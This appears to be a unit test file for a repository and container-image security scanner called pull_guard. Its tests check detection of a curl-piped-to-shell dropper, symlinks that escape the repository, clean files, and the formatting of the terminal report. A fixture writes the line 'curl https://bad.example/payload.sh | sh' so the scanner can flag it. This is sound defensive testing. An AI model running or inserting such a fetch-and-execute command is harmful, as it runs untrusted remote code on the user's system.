import tempfile
import tarfile
import unittest
from unittest import mock
from pathlib import Path

import pull_guard


class PullGuardTests(unittest.TestCase):
    def test_detects_suspicious_shell_dropper(self) -> None:
        with tempfile.TemporaryDirectory() as tempdir:
            repo = Path(tempdir)
            script = repo / "install.sh"
            script.write_text("curl https://bad.example/payload.sh | sh\n", encoding="utf-8")

            with mock.patch("pull_guard.run_clamscan", return_value=[]):
                findings = pull_guard.scan_repository(repo)

            self.assertTrue(any(item.rule == "curl-pipe-shell" for item in findings))

    def test_detects_repo_symlink_escape(self) -> None:
        with tempfile.TemporaryDirectory() as tempdir:
            repo = Path(tempdir)
            target = repo / "outside-link"
            target.symlink_to("/tmp/evil")

            with mock.patch("pull_guard.run_clamscan", return_value=[]):
                findings = pull_guard.scan_repository(repo)

            self.assertTrue(any(item.rule == "symlink-escape" for item in findings))

    def test_clean_file_has_no_findings(self) -> None:
        with tempfile.TemporaryDirectory() as tempdir:
            repo = Path(tempdir)
            source = repo / "main.py"
            source.write_text("print('hello world')\n", encoding="utf-8")

            with mock.patch("pull_guard.run_clamscan", return_value=[]):
                findings = pull_guard.scan_repository(repo)

            self.assertEqual(findings, [])

    def test_image_busybox_style_symlink_is_not_flagged(self) -> None:
        member = tarfile.TarInfo("bin/sh")
        member.type = tarfile.SYMTYPE
        member.linkname = "/bin/busybox"

        findings = pull_guard.scan_tar_member(member, None)  # type: ignore[arg-type]

        self.assertEqual(findings, [])

    def test_terminal_report_shows_clean_status(self) -> None:
        report = pull_guard.format_terminal_report(
            [],
            mode_label="Repository Scan",
            target_label="/tmp/example",
            disable_color=True,
        )

        self.assertIn("Pull Guard Terminal Dashboard", report)
        self.assertIn("Status   : [CLEAN]", report)
        self.assertIn("No suspicious indicators were found.", report)
        self.assertIn("Recommendations", report)

    def test_terminal_report_shows_findings(self) -> None:
        report = pull_guard.format_terminal_report(
            [
                pull_guard.Finding(
                    severity="high",
                    scope="repo",
                    target="payload.sh",
                    rule="curl-pipe-shell",
                    detail="Detected curl piped directly into a shell.",
                )
            ],
            mode_label="Repository Scan",
            target_label="/tmp/example",
            disable_color=True,
        )

        self.assertIn("Status   : [REVIEW REQUIRED]", report)
        self.assertIn("HIGH RISK", report)
        self.assertIn("curl-pipe-shell", report)
        self.assertIn("payload.sh", report)


if __name__ == "__main__":
    unittest.main()
